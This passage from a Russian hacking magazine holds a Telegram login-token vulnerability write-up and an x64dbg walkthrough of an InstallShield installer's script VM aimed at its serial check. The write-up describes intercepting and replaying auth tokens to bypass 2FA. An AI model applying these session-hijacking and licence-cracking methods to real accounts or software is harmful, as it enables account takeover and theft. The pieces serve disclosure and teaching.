рованный crackme03.64 с параметром nDoEiA и наблюдай результат.





                              Пароль найден




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
    — CUTTER НА РАДАРЕ
             ИССЛЕДУЕМ ПРОГРАММЫ
          В ГРАФИЧЕСКОЙ НАДСТРОЙКЕ
                 CUTTER ДЛЯ RADARE2





ВЫВОДЫ

Поскольку Cutter в определенных кругах снискал широкую известность, гра‐
ничащую с популярностью, я планировал написать обзор, рассказывающий
о возможностях Cutter с разных точек зрения.
  На  первый  взгляд,  Cutter  имеет  очень  перегруженный  интерфейс.
Но довольно скоро становится понятно, что ничего лишнего в нем нет. И все
эти многочисленные окошки, вкладки и разные менюшки однозначно нужны
и полезны.
  Я показал на примере крякми, как исследовать программу с исполь‐
зованием статического и динамического анализов. Первый крякми оказался
совсем простым, и мы его решили, не прибегая даже к дизассемблеру, одна‐
ко он прекрасно подошел для испытания возможностей Cutter. Второй крякми
нахрапом в лоб не решается, он не содержит в своем теле заветного клю‐
чика, и одним только дизассемблированием с ним не справиться. Поэтому
нам пришлось  прибегнуть  к помощи  отладчика: с его использованием
решение вылилось в элегантный и понятный процесс — мы восстановили
механизм превращения заранее известной строки в полноценный пароль
и тем самым нашли спрятанный ключик.


Совет
Первое, на что  следует обратить внимание в новой версии  Cutter, —
в области графа (Graph) или дизассемблера (Disassembly) ссылки на области
памяти отображаются в виде переменных (var_1ch), а не в виде выражения
(адрес базы стека минус количество байтов: rbp - 1ch). Порой новый тип
отображения идет  вразрез со  здравым смыслом  (поди‑ка  найди,  где
переменная инициализируется) и доводит до бешенства.




                      Отображение по умолчанию

Чтобы вернуть стиль вывода к старому формату, зайди в настройки Edit →
Preferences. В появившемся окне в столбце слева выбери Disassembly, спра‐
ва перейди на вкладку Metadata и сними флажок с пункта Substitute variables
in disassembly (asm.sub.var).





                   Старый добрый формат отображения

Еще одна возможность использовать реальный адрес — когда во время
отладки тебе надо посмотреть, что находится по определенному смещению.
Rizin Console переменные не понимает, зато прекрасно ориентируется в сме‐
щениях.



Еще совет
Если тебе  нравятся темные тона интерфейса, открой окно Preferences,
в списке слева выбери Appearance, в области справа в выпадающем списке
Interface Theme выбери Dark или Midnight по вкусу. Но это еще не всё.
К сожалению, ни одна цветовая тема (выпадающий список Color Theme)
не предлагает вменяемый цвет для выделения активной (текущей) строки
при отладке. Она отображается черной на темном фоне, то есть становится
совершенно неразличимой.
   Чтобы исправить это недоразумение, сделай копию наиболее устра‐
ивающей тебя цветовой темы, а после ее выбора нажми кнопку Edit Theme.





                   Окно Preferences → область Appearance

В открывшемся окне Theme Editor в списке слева найди строку Line highlight,
выбери ее. В области просмотра справа она начнет мигать, откорректируй ее
желаемый цвет в панели, расположенной выше области просмотра. Обрати
внимание на настройку прозрачности: ты же не хочешь, чтобы из‑за заливки
определенным цветом не был виден код в активной строке?





                         Theme Editor
ВЗЛОМ





Разработчики Telegram не сидят без дела:
в мессенджере с каждым годом все больше
функций. Но некоторые из них, если переф‐
разировать «Собачье сердце», могут прев‐
ратиться «из классной фичи в мерзкий баг».          Антон Шустиков                                                                                          Консультант по FinTech,
Этот материал — о любопытной уязвимос‐              крипто, ИБ                                                                                   @CakesCats_com
ти, с которой  я  столкнулся,  расследуя,
как украли 200 миллионов рублей в крипте
зимой 2025 года.


КОРЕНЬ ПРОБЛЕМЫ

Сценарий простой. Представь, что ты открываешь встроенный в Telegram
браузер и переходишь по ссылке на web.telegram.org. Почти мгновенно —
без ввода пароля, без подтверждения входа, без оповещений — ты оказыва‐
ешься авторизован. Вроде ничего необычного: ты ведь и так уже в Telegram!
Но теперь представь, что злоумышленник вовремя перехватит этот
токен . И использует его... скажем, в другом браузере. Или на другом устрой‐
стве.
  Что получается: Telegram  запускает сессию с широкими правами,
не требуя клауд‑пароля, не уведомляя пользователя и не отслеживая, где эта
сессия используется. Нет браузерной привязки. Нет логов. Нет никаких огра‐
ничений!


РЕАЛЬНЫЙ КЕЙС: КРАЖА КРИПТЫ

Я занимаюсь ИТ‑просвещением в рамках независимого некоммерческого
проекта CakesCats, посвященного цифровой гигиене, безопасности и ана‐
лизу современных угроз. К проекту обращаются люди с вопросами и кей‐
сами.
   Пострадавший в этом инциденте пришел ко мне в начале 2025 года через
публичные каналы. Он пострадал от кражи криптовалюты на очень значитель‐
ную сумму.
   После базового аудита я был сильно впечатлен, что следов почти нет.
Такое встречается крайне редко, если не сказать, что я с таким встретился
впервые. Но я не собирался сдаваться и постепенно нашел 0-day в Telegram.


             INFO

                   В процессе расследования я использовал Mobile
                              Verification Toolkit (MVT). Большое спасибо его
                          разработчикам и сообществу за отличный инс‐
                            трумент!


Вот цепочка событий, которую мне удалось восстановить:
 • Пользователь зашел на сайт и авторизовался через Telegram Login
  Widget.
 • Через несколько часов с криптокошельков исчезли все средства.
 • Seed-фразы хранились в Telegram (что, конечно, очень плохая прак‐
   тика).
 • Атакующий,   воспользовавшись   сессией,   достал   содержимое
  заметок, не входя явно в Telegram, и получил доступ к крипте.
 • Не было уведомлений о необычных новых сессиях или подтверждений вхо‐
   да — Telegram или девайс человека «не заметил» кражу.


ТЕХНИЧЕСКИЙ КОНТЕКСТ

Пострадавший использовал iPhone с iOS версии 18.3 и браузер Safari. Также
было известно, что для авторизации в Telegram он использовал виджет
из серии Telegram Widgets.
  Я тщательно проверил все  клиентские устройства в поисках следов
и опросил пользователя — он не находил никаких «потерянных флешек» и не
заметил ничего подозрительного. Ситуация оказалась максимально нетипич‐
ной: я не припомню случая, когда не осталось бы ни единого реального
доказательства. Обычно все куда проще: чья‑то невнимательность, злой умы‐
сел кого‑то из близкого круга, вредоносное ПО. Но здесь — пустота.
   Атака на macOS или iOS сама по себе  требует серьезных  усилий:
это сложная операция, которая неизбежно оставляет  отпечатки — нес‐
тандартные запросы, сбои в правах доступа, а то и всплеск крашей в логах
в ключевой день, когда происходил пивотинг. Но и тут — ничего.
  В тот момент в регионе, где находился клиент, проходила ИТ‑конферен‐
ция, в том числе с участием телеком- и кибербезопасных структур. Владелец
айфона остановился в гостинице, которая принимала участников, — поездка
была спонтанной. Это может быть совпадением, но также и индикатором вы-
сокоорганизованной атаки уровня APT. В таких случаях высока веро‐
ятность, например, использования IMSI-catcher или подобного оборудо‐
вания, а также непубличных эксплоитов.
   Обнаружилась лишь одна интересная деталь: в базовых логах iPhone
(baseband logs) отсутствовали записи за два дня, когда предположи‐
тельно и была проведена атака. За два с половиной месяца — это единствен‐
ное слепое пятно.
   Опять же, рут iPhone — это нетривиальная задача, даже если это твой
собственный телефон. А тут неизвестные провели такую  атаку удаленно
и забрали только содержимое заметок в Telegram! У клиента были еще и бро‐
керские и банковские приложения, где тоже хранились деньги. И ничего
из этого не тронуто.
   Методом исключения и пошагового разбора  killchain  атаки родилась
единственная правдоподобная гипотеза: была перехвачена сессия Telegram.
Где именно и каким образом это произошло — остается загадкой даже сей‐
час. Ни один из стандартных сценариев не подтверждается. И все же именно
эта версия подтолкнула меня глубже копать в сторону возможных манипу‐
ляций с сессиями Telegram.
  Но тут есть одно но...


TELEGRAM LOGIN WIDGET И НЕВИДИМЫЕ СЕССИИ

Во время тестирования было зафиксировано интересное поведение.
 • В обычных условиях после входа через Telegram Login Widget появляется
   новое устройство и его «сессия» — она видна в настройках аккаунта.
 • Однако, особенно в случае авторизации через Telegram-сайты, новая сес‐
   сия при каждом входе не создается — ни в списке устройств, ни в перечне
   подключенных сайтов ты ее не увидишь. Более того, даже если вручную
   выйти из аккаунта, сам токен авторизации остается рабочим и позволяет
   снова и снова входить в систему без ограничений.
 • Единственный след — это системное уведомление от Telegram о входе
   в аккаунт. После этого — тишина. Однако при повторной авторизации
   на сторонних сервисах с тем же токеном все продолжает работать — и это
  лишь подтверждает, что сессия все еще активна.

Такое поведение затрудняет отслеживание или даже просто обнаружение
того факта, что кто‑то вошел в аккаунт пользователя. Менеджмент сессий
просто невозможен.


ГИПОТЕЗА: WIDGET → ТОКЕН → ДОСТУП К ДАННЫМ

На практике механизм логина через виджет должен выглядеть так:
 1. Пользователь кликает на Telegram Login на сайте.
 2. Telegram возвращает токен сессии, который доступен внутри браузера.
 3. Этот токен можно перехватить до редиректа. Например, это можно сде‐
   лать через JS-логирование, расширение, вредонос или сниффинг тра‐
   фика.
 4. Получив  токен,  злоумышленник  может  авторизоваться  внутри

  инфраструктуры  Telegram,  например  на  web.telegram.org
  в другом браузере, получить доступ к аккаунту (или его части — нап‐
   ример, букмаркам или чатам), не вызывая никаких подозрений.

При этом:
 • Telegram не всегда добавляет такую сессию в лог;
 • cloud password (2FA) не запрашивается;
 • повторное использование токена может сработать, если оно происходит
   достаточно быстро или с того же IP.

В нашем случае по‑прежнему очень много странного. А именно:
 • нет уведомлений, значит, пользователь не подозревает о доступе;
 • закладки в Telegram не зашифрованы (или доступны в рамках сессии);
 • базовые логи iOS «пропали» именно в момент атаки;
 • Telegram Login Widget дал токен с правами на  приватные чаты
  и звонки;
 • возможный  вектор похищения данных — через встроенный браузер
   Telegram, где перехват токена до редиректа возможен.

Вот как это выглядит на практике. Когда пользователь авторизуется через
Telegram Browser (тот самый, который используют для автологина в сервисы
вроде bugs.telegram.org или web.telegram.org), создается токен. При этом:
 • не требует клауд‑пароля, даже если он включен;
 • не создает новых сессий в списке «Активные устройства»;
 • не вызывает уведомлений Telegram о входе;
 • не привязан к браузеру или устройству, откуда он был получен;
 • имеет (хотя уже правильнее говорить «имел») возможность принимать
   входящие и запускать приватные сессии.





Это почти идеальный сценарий для захвата сессии.


PROOF-OF-CONCEPT: ТОКЕН ИЗ НИОТКУДА

Технически все просто. Мы используем встроенный браузер Telegram (нап‐
ример, при переходе по ссылке внутри Telegram, он включен по умолчанию),
ловим момент до редиректа — и сохраняем токен авторизации.


https://web.telegram.org/#/login?auth_token=eyJhbGciOi...

Если успеть, можно использовать этот токен где угодно: в Firefox, Chrome,
даже в headless-сценариях. И все это — без необходимости входа, под-
тверждений или повторной авторизации.
   Как это сработало в нашем сценарии? Представим, что у пользователя
активен Telegram, где‑то в фоне открыта сессия и он кликнул по ссылке,
ведущей на web.telegram.org. Пока браузер Telegram делает редирект, зло‐
умышленник (через установку плагина, JS-инъекции или эксплоит на стороне
клиента, да хоть бы просмотр истории браузера) перехватывает токен. Всё!
   Дальше — просто: токен вставляется в URL, и злоумышленник получает
сессию Telegram Web, полную, рабочую, неотслеживаемую. Без пароля.
Без 2FA.


ПОЧЕМУ ЭТО РАБОТАЕТ?

Основная проблема — отсутствие строгой привязки токена к среде.
Telegram генерирует токены, которые действуют как входной билет на «пол‐
ную версию», но не ограничивает, кто, где и как их применяет. Это классичес‐
кая ошибка проектирования: авторизационный токен, не имеющий
контекста среды выполнения.
   Даже если Telegram считает, что токены привязаны к сессии, на практике
мы видим:
 • они живут дольше, чем должны;
 • не инвалидируются (!) при удалении сессии;
 • могут быть использованы за пределами того браузера, где были созданы.


ЧТО УЖЕ ПОМЕНЯЛИ В TELEGRAM?

На момент подготовки статьи видно, что разработчики Telegram отредак-
тировали поведение виджетов, — теперь те чаще создают сессии
без прав. Однако никаких публичных уведомлений об этом не последовало.
Ни упоминания в каналах Telegram Dev, ни записи в changelog.
   Пока неизвестно, была ли эта уязвимость закрыта из‑за внутреннего ауди‐
та, жалоб пользователей или внешнего отчета. Но факт остается фактом: она
существовала, и эксплуатация была возможна — тихо, без следов и с реаль‐
ным доступом.
   Отмечу и некоторые изменения по линии Telegram Widget: уже в день
написания этого текста разработчики попытались ограничить поведение вид‐
жетов. Теперь виджеты, судя по всему, не создают сессии с привилегиями.
Но это не касается автоматических токенов авторизации, генерируемых сис‐
темой при переходе через браузер Telegram. Эти токены могут использовать‐
ся в обход всех ограничений. Вообще всех!


ВЫВОДЫ

Итак, авторизационные токены Telegram могут использоваться для доступа
к аккаунту в обход cloud-пароля и систем оповещений. Сессия, созданная
через встроенный браузер Telegram, потенциально может быть перехвачена
и воспроизведена злоумышленником. Отсутствие полноценного контроля
среды — таких параметров, как User-Agent, IP-адрес или цифровой отпечаток
устройства, — делает Telegram уязвимым перед классическими атаками типа
session hijacking.
  И речь здесь идет не просто о техническом баге, а об архитектурной уяз‐
вимости, которая заслуживает самого серьезного внимания — как со сто‐
роны разработчиков, так и со стороны сообщества.
   Такой «пасхальный» (поскольку нашел я его на Пасху) 0-day! Приятный
сюрприз для ресерчера, но не для пользователей. Если у тебя Telegram
с включенной двухфакторной аутентификацией и ты думаешь, что никто
не может войти без твоего ведома, — подумай дважды! Особенно если тебе
есть что терять, как в случае моего клиента.
ВЗЛОМ





В сегодняшней статье мы подробнее раз‐
берем работу виртуальной машины уста‐
новщика     InstallShield    в    динамике
при помощи нашего любимого отладчика
                                                                               JaboHack
x64dbg на примере инсталлятора одного
технического приложения.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для специалистов по безопасности,
                          проводящих тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой вред,  причиненный с  применением
                          изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.


Новое — это хорошо забытое старое, поэтому любую тему, чтобы не при‐
елась, надо подольше выдержать в прохладном темном подвале. Я думаю, ты
помнишь старую статью «Ломаем инсталлятор. Как обмануть инсталлятор MSI
методом для ленивых», в которой мы начинали разбор инсталляционных
скриптов для пакета InstallShield. Я тогда сразу предупредил, что это самый
ленивый способ патча без разбора виртуальной машины и отладки для сов‐
сем  простых  случаев. Ну  это  примерно  как  патчить EXE-файл  только
при помощи WinHex без отладчика и дизассемблера или чинить компьютер
одной плоской отверткой.
   Прошло уже пять лет, мы многому научились, так что пора достать эту тему
из подвала и продолжить разбор, пока InstallShield совсем не потерял акту‐
альность. Итак, у нас есть инсталлятор приложения, который при установке
запрашивает данные пользователя и серийный номер.





При вводе неверного серийного номера, как ты уже, наверное, догадался,
инсталлятор выдает предупреждение и отказывается двигаться дальше. Нам
предстоит понять, как он проверяет код. На этот раз патчить мы ничего
не будем. Во‑первых, потому что мы честные люди и нам интересен не конеч‐
ный результат, а сам процесс чисто в образовательных целях, а во‑вторых,
процесс патчинга мы уже разбирали в упомянутой статье, с которой я тебе
рекомендую ознакомиться для лучшего понимания того, о чем я буду писать
ниже. Впрочем, для ленивых и нетерпеливых я буду стараться объяснять так,
чтобы читатель не сильно страдал от недостатка информации.
   Чтобы не засорять повествование дублированием информации из пре‐
дыдущей  статьи,  опустим процесс  поиска, извлечения и декомпиляции
инсталляционного скрипта setup.inx — в нашем случае файлы setup.inx,
data1.cab, data1.hdr и другие лежат в явном виде рядом с установщиком
setup.exe. Для расшифровки и декомпиляции скрипта используем утилиту
isDcc31.exe — это более новый аналог утилиты isDcc, описанной в предыду‐
щей статье, а что поделать, годы летят! Тулзу можно взять, например, из пос‐
ледней версии пакета UniExtract. Кстати, этим же инструментом, точнее, вхо‐
дящей в его состав утилитой IsXunpack.exe можно при необходимости рас‐
паковать и исследовать инсталляционный cab-архив, но нас пока что инте‐
ресует инсталляционный скрипт setup.inx. Расшифровываем (unscramble)
его следующей командой:


isdcc31.exe -u setup.inx

Затем декомпилируем:


isdcc31.exe setup.inx.dec >setup.dec

На этом предварительный этап заканчивается и начинается процесс изыс‐
каний. Мы получили примерно мегабайт текстового кода, в котором нет
ни имен переменных или процедур, ни текстовых строк, способных как‑то
внести ясность в понимание процесса проверки и чтения серийного номера.
Поэтому схалтурить, как в предыдущем случае, у нас не получится — надо
расчехлять  отладчик  и   кропотливо  разбирать   виртуальную  машину
InstallShield.
  Мы уже успели изрядно поднатореть в этом непростом деле, поэтому дей‐
ствуем по стандартной схеме. Когда установщик висит на окне ввода серий‐
ного номера и данных пользователя, подключаемся отладчиком x64dbg к про‐
цессу setup.exe. Для начала  попробуем  проверить самую  очевидную
гипотезу, что шитый код виртуальной машины в этот момент находится
в памяти процесса. В этом случае можно было бы поставить точку останова
на обращение к какому‑то известному участку этого кода, чтобы отследить
его со стороны виртуальной машины.
  К сожалению, поиск в памяти результатов не дает, что наводит на пред‐
положение: шитый код не  интерпретируется непосредственно, а с ним
при  загрузке  происходит какая‑то  обработка, возможно, даже  JIT-ком‐
пиляция, как в случае с IL или JVM. Конечно, таких пытливых специалистов,
как мы, это досадное препятствие не пугает, поэтому попробуем подойти
к решению проблемы со стороны WinAPI.
   Резонно полагая, что для чтения текста из поля ввода обычно использует‐
ся функция user32.GetDlgItem, ставим бряк на нее и смело жмем Next.
Это очень  распространенная  функция,  поэтому  приходится  проскочить
с десяток неинтересных нам системных вызовов из различных обработчиков
событий, пока не натыкаемся на интересующее нас место прямого обра‐
щения из InstallShield, стек вызовов которого выглядит так.





Наш натренированный глаз сразу распознает рекурсивный вызов подпрог‐
рамм виртуальной машины (повторяющиеся паттерны в  стеке выделены
стрелками). Вдобавок стало понятно, в какой именно библиотеке эта самая
виртуальная машина сидит, — это модуль issetup.dll, в нашем случае
лежащий в каталоге рядом с setup.exe. Правда, хитрые разработчики неук‐
люже запаковали ее при помощи PECompact, но это даже смешно: не отвле‐
каясь на поиск распаковщика, тупо дампим либу при помощи Scylla и скар‐
мливаем сдампленное дизассемблеру IDA.
   Теперь начинаем вдумчиво изучать стек вызовов, опираясь на восстанов‐
ленный в IDA код issetup.dll. Буквально на втором сверху вызове нас ждет
интересное открытие — user32.GetDlgItem непосредственно вызывается
из функции, ссылка на которую находится в vftable такого вида.





                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
       INSTALLSHIELD
           ИЗНУТРИ
              ПРЕПАРИРУЕМ ВИРТУАЛКУ
              ИНСТАЛЛЯТОРА В ×64DBG




Для дальнейшего понимания этой таблицы попробуем сделать то, что мы
должны были сделать еще в предыдущей статье, но впопыхах проскочили
из‑за банальной лени, а именно — разобрать систему команд шитого кода
интерпретатора инсталляционного скрипта. В прошлый раз мы, помнится,
ограничились эмпирическим нахождением опкодов 0xD (сравнение на экви‐
валентность) и 0xE (сравнение на неравенство). На этот раз мы копнем пог‐
лубже и попробуем вытащить полную систему команд.
  Для этого нам понадобится какой‑нибудь декомпилятор INX в исходных
кодах. Можно использовать исходники нашего isDcc c гитхаба, но, по‑моему,
гораздо  удобнее и  нагляднее  использовать для  этого  другой  деком‐
пилятор — InstallScript Decompiler, который умеет не только декомпилировать,
но еще и дизассемблировать INX-код. Впрочем, на мой взгляд, реально
декомпилировать скрипты все же удобнее isDcc, потому что  InstallScript
Decompiler изрядно глюкав.
  В итоге, покопавшись в коде InstallScript Decompiler, мы находим модуль
Action, содержащий список команд интерпретатора (их так и называют —
Actions) со своими опкодами. Их не так много, поэтому приведу здесь таб‐
лицу целиком:


 Опкод         Описание

 1               CNOPAction

 2                 CAbortAction

 3                  CExitAction

 4                  CIfAction

 5                CGotoAction

 6                 CAssignAction

 7               BinAdd

 8              BinMod

 9                 BinLT

 10              BinGT

  11                BinLTE

 12              BinGTE

 13               BinEq

 14              BinNEq

 15              BinSub

 16               BinMul

 17                BinDiv

 18                BitAnd

 19                 BitOr

 20                 BitXor

 21             ~

 22                  BitShl

 23                 BitShr

 24             LogAnd

 25              LogOr

 26               CAddressOfAction

 27               *

 28                 CIndirectStructAction

 29               CSetByteAction

 30               CGetByteAction

 32               CDLLFuncCallAction

 33                CInternalFuncCallAction

 34               CFuncPrologAction

 35               CReturnAction

 36               CReturnAction

 37               CReturnAction

 38              CEndFuncAction

 39              CNOPAction

 40               CStrLengthCharsAction

  41               CStrSubAction

 42                CStrFindAction

 43              CStrCompareAction

 44              CStrToNumAction

 45               CNumToStrAction

 46               CHandlerAction

 47               CHandlerExAction

 48               CDoHandlerAction

 49               CResizeAction

 50                CSizeofAction

  51               CPropPutAction

 52               CPropPutRefAction

 53               CPropGetAction

 54                CTryAction

 55               CEndTryAction

 56              CEndCatchAction

 57              CUseDLLAction

 58              CUnUseDLLAction

 59                CBindVariableAction

 60               CAddressOfWideAction

Эмпирически подобранные нами в предыдущей статье акции с опкодами 0xD
(13) и 0xE (14), соответственно, являются BinEq и BinNEq, что вполне впи‐
сывается в рассматриваемую схему. Еще немного покурив исходники деком‐
пиляторов, приходим  к примерному пониманию  структуры шитого кода
инсталляционного скрипта. Разберем ее на примере функции с условным
названием function0, бинарный код которой приведен на следующем рисун‐
ке.





Декомпилированный в isDcc31 код этой функции выглядит так:


    function function0(pBool0)
    begin
Label0:
008142:0006:         pBool0 = 0;
00814E:0014:         lString0 = lString4 ^ "MANUALS\\setup.exe";
00816C:0021:         call function438(3,lString0);
00817A:0006:         lNumber0 = number0;
008184:000D:         lNumber0 = lNumber0 == 1;
008193:0004:         if lNumber0 == false then goto label1 ;
00819F:0006:         pBool0 = 1;
Label1:
0081AD:0024:         return;
0081BB:0026:         end;
    end;

Для лучшего понимания приведу еще ее «дизассемблированный» с помощью
InstallScript Decompiler код, но я предупреждал, дизассемблер там весьма
специфичен:


8137: v {CNumArg} -101 = 0
8137: v {CStrArg} -101 = v {CStrArg} 4 13 "MANUALS\setup.exe"
8137: Func_1107(3, v {CStrArg} -101)
8137: v {CNumArg} -102 = v {CVariantArg} 0
8137: v {CNumArg} -102 = v {CNumArg} -102 7 1
8137: If (else:1) v {CNumArg} -102
8137: v {CNumArg} -101 = 1
81ab: RETURN
81ab: EndFuncAction

Функция начинается со смещения 0x8137, но первая  непосредственно
исполняемая  акция  кода  находится  по  смещению  0x8142.  Стоящую
перед ней акцию CFuncPrologAction (опкод 0x22, смещение 0x8139)
по какой‑то причине декомпилятор игнорирует, видимо, из‑за отсутствия
информативности.
  Мы выбрали самую простую функцию, состоящую всего из десяти акций,
их структура примерно одинакова. Первые два байта — опкод (выделено
красным).   Соответственно,   первая   команда,   как  я  уже  говорил,
CFuncPrologAction (0x22), вторая — CAssignAction (6), третья — BitXor
(0x14, в случае строковых параметров эта акция используется для конкатена‐
ции строк), четвертая — CInternalFuncCallAction (0x21) и так далее.
  Два следующих байта обычно представляют собой счетчик параметров
акции (выделено желтым). В нашем примере исключение составляют только
акции CFuncPrologAction (в ней счетчик почему‑то нулевой, хотя по факту
параметр у нее один — числовая константа размера блока кода функции
в байтах) и CInternalFuncCallAction, в ней следующие два байта представ‐
ляют собой внутренний номер функции (483=0x1B6, выделено сиреневым),
за которым идет счетчик параметров.
  За счетчиком следует список параметров акции (выделено зеленым). Пер‐
вый байт каждого параметра характеризует его тип, в зависимости от которо‐
го определяется и длина параметра. К примеру, тип числовой константы
CNumArg 7 (единственный параметр CFuncPrologAction, третий параметр
CAssignAction и так далее) подразумевает 32-битные данные, следующие
за ним. Тип 6 строковой константы (CStrArg), использующийся, например,
как третий параметр BitXor, содержит строку с 16-битным счетчиком, сле‐
дующим непосредственно за типом параметра. Параметры 4 и 5 указывают
на переменные, которые идентифицируются знаковым 16-битным иден‐
тификатором, причем отрицательные значения внешние к этой функции
(видимо, из‑за положения во внутреннем стеке), а положительные — переда‐
ваемые в качестве параметров.
  Но самое оригинальное — работа с метками условных и безусловных
переходов. Обычно интерпретаторы шитого кода используют концепцию, ког‐
да параметром команды перехода является смещение в байтах или командах
относительно этой команды, на которое нужно сдвинуть счетчик команд в слу‐
чае перехода. Тут все совсем не так. Видимо, для удобства компиляции
шитого кода все функции разбиты на блоки акций. Эта функция состоит
из двух блоков, начинается с размера первого блока кода в акциях (8 по сме‐
щению 0x8142, выделено белым).
   Следующий блок начинается со смещения 0x81AB и состоит из двух акций.
В командах перехода в качестве адреса используется порядковый номер
блока  относительно  блока, содержащего текущую команду перехода  (в
виде 32-битной константы типа CNumArg). К примеру, перейти на начало
текущего блока — 0, на начало следующего — 1, на начало предыдущего —
-1 или 0xFFFFFFFF. То есть конструкция по смещению 0x8193, неуклюже
декомпилированная как if lNumber0 == false then goto label1 или —
еще более упорото — If (else:1) v {CNumArg} -102, представляет собой
всего‑навсего вызов акции CIfAction, которая  проверяет переменную
0xFF9A на истинность, и если  проверка не проходит, то  осуществляет
переход на следующий блок 0x81AD.
  На этом пока что остановим погружение в глубины специфических осо‐
бенностей построения шитого кода и вернемся к нашим баранам. Теперь,
когда мы достигли понимания структуры шитого кода, разбираться с натив‐
ным кодом будет на порядок проще. Мы явно нашли таблицы виртуальных
функций для каждой акции интерпретатора инсталляционного скрипта, при‐
чем адрес функции, исполняемой при интерпретации кода, находится по сме‐
щению 4 от начала каждой акции (выделено).





Попутно мы нашли сам интерпретатор, который последовательно исполняет
акции при интерпретации скрипта (сам вызов функции обработчика выделен).





                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
       INSTALLSHIELD
           ИЗНУТРИ
              ПРЕПАРИРУЕМ ВИРТУАЛКУ
              ИНСТАЛЛЯТОРА В ×64DBG




К сожалению, наши опасения оправдались: в момент интерпретации шитый
код уже слегка откомпилирован в таблицу объектов и доступа к исходному
коду нет. Вдобавок при отсутствии в коде имен функций и переменных ста‐
новится как‑то грустно — надо придумать, как осуществить хоть какую‑то при‐
вязку отладчика к декомпилированному коду скрипта.
   Первая мысль — поставить условные бряки на вызов обработчика каждой
акции с логированием в журнал, благо их всего несколько десятков. Таким
образом мы получим хотя бы трассу выполнения определенных участков
скрипта, которую, хоть и с большим трудом, можно сопоставить с деком‐
пилированным кодом. Кроме того, можно логировать не все инструкции,
а только определенные их группы, необходимые на данный момент. К при‐
меру, в нашей задаче требуется отследить манипуляции с введенной стро‐
кой —  ставим  бряки  на  акции,  которые  работают  со  строками:
CStrLengthCharsAction,        CStrSubAction,        CStrFindAction,
CStrCompareAction... В итоге получаем трассу вида


...
StrSub L"<IFX_PRODUCT_DISPLAY_NAME>"
StrSub L"IFX_PRODUCT_DISPLAY_NAME"
Strlen L"%P"
Strlen L"Please enter your name, the name of the company for which
you work and the product serial number."
StrSub L"<IFX_PRODUCT_DISPLAY_VERSION>"
StrSub L"IFX_PRODUCT_DISPLAY_VERSION"
Strlen L"%VS"
Strlen L"19.03.000"
Strlen L"Please enter your name, the name of the company for which
you work and the product serial number."
Strlen L"<IFX_INSTALLED_DISPLAY_VERSION>"
StrSub L"<IFX_INSTALLED_DISPLAY_VERSION>"
...

Это уже серьезно облегчает анализ действий со строками, которые выпол‐
няет сам скрипт. Чтобы отследить случаи, когда строки передаются в какие‑то
внешние   библиотеки,   поставим  бряк  с   логированием  на  акцию
CDLLFuncCallAction.





Как видно, трасса при этом стала заметно информативнее:


...
call dll function <isrt._DoSprintf>
call dll function <isrt._SetupTraceWrite>
Strlen L"<IFX_PRODUCT_REGISTEREDOWNER>"
StrSub L"<IFX_PRODUCT_REGISTEREDOWNER>"
Strlen L"<IFX_PRODUCT_REGISTEREDOWNER>"
StrSub L"<IFX_PRODUCT_REGISTEREDOWNER>"
StrSub L"IFX_PRODUCT_REGISTEREDOWNER"
call dll function <isrt._DoSprintf>
call dll function <isrt._SetupTraceWrite>
call dll function <isrt._DoSprintf>
call dll function <isrt._SetupTraceWrite>
Strlen L"<IFX_PRODUCT_REGISTEREDCOMPANY>"
StrSub L"<IFX_PRODUCT_REGISTEREDCOMPANY>"
Strlen L"<IFX_PRODUCT_REGISTEREDCOMPANY>"
StrSub L"<IFX_PRODUCT_REGISTEREDCOMPANY>"
StrSub L"IFX_PRODUCT_REGISTEREDCOMPANY"
call dll function <isrt._DoSprintf>
call dll function <isrt._SetupTraceWrite>
call dll function <isrt._DoSprintf>
call dll function <isrt._SetupTraceWrite>
Strlen L"<IFX_PRODUCT_REGISTEREDSERIALNUM>"
StrSub L"<IFX_PRODUCT_REGISTEREDSERIALNUM>"
Strlen L"<IFX_PRODUCT_REGISTEREDSERIALNUM>"
StrSub L"<IFX_PRODUCT_REGISTEREDSERIALNUM>"
StrSub L"IFX_PRODUCT_REGISTEREDSERIALNUM"
call dll function <isrt._DoSprintf>
call dll function <isrt._SetupTraceWrite>
call dll function <isrt._EndDialog>
call dll function <isrt._ReleaseDialog>
...

Но все же остается открытым вопрос: как привязать отладку к декомпилиро‐
ванному коду без имен функций и переменных? Оказывается, можно найти
и такой способ. Дело в том, что в декомпилированном коде только на первый
взгляд все  функции безымянные и  пронумерованы  хаотично. Если ты
заметил, каждая функция в своем названии содержит номер, соответству‐
ющий номеру в таблице функций, приведенной в начале скрипта.
   Этот номер не считается автоматически — он уникален для каждой фун‐
кции   и    используется    (как   я   уже   писал   выше)   в   акции
CInternalFuncCallAction  между  опкодом и  количеством  параметров.
Номер можно получить из параметров вызова CInternalFuncCallAction
и логировать его тоже при помощи вот такой точки останова.





Так мы убиваем сразу двух зайцев. Во‑первых, при логировании вызовов
CInternalFuncCallAction и CDLLFuncCallAction мы осуществляем полную
привязку отладки скрипта к декомпилированному коду и в любой точке оста‐
нова понимаем, внутри какой функции мы остановились. Во‑вторых, модифи‐
цируя условие точек останова, мы можем организовать останов на любой
функции скрипта, где пожелаем.
   Таким образом, мы не только разобрались во внутренней структуре
инсталляционных скриптов, но и своими руками превратили x64dbg в мощный
инструмент отладки скомпилированных установочных скриптов InstallShield.
И ничего, что описанная в статье версия InstallShield изрядно устарела,
использованные в ней принципы вполне пригодятся для анализа, и ты,
при известном желании и сноровке, сможешь отлаживать и реверсировать
скрипты, даже опережая создание новых версий декомпиляторов для них.
ВЗЛОМ





Иногда в мои руки попадают весьма экзо‐
тические   продукты,  для   исследования
которых отсутствуют проверенные инстру‐
менты, а информации о них в интернете —
кот  наплакал.  Давай  разберем  именно            JaboHack
такой случай и расковыряем приложение,
созданное в среде WinDev.


Сегодня мы поговорим о французской компании PC SOFT и ее продукте
WinDev — среде для разработки СУБД, а также веб- и мобильных приложе‐
ний. Несмотря на то что создатели изначально замахивались на кросс‑плат‐
форменность, продукт получился действительно очень экзотический: он под‐
держивает всего три национальных языка и за пределами Франции прак‐
